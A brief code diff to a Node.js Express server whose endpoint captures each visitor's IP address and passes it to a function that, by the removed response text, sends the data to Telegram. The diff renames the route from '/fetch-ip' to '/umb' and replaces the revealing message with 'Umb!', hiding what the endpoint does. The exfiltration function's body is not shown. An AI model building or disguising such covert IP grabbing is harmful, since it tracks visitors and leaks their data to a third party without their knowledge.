@@ -40,14 +40,14 @@ async function fetchUserData(ip) {
 }
 
 // Endpoint to capture user IP and fetch data
-app.get('/fetch-ip', async (req, res) => {
+app.get('/umb', async (req, res) => {
   // Extract user's IP from the request headers
   const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 
   // Fetch user data using their IP
   await fetchUserData(userIp);
 
-  res.send('User IP data fetched and sent to Telegram!');
+  res.send('Umb!');
 });
 
 // Start the server
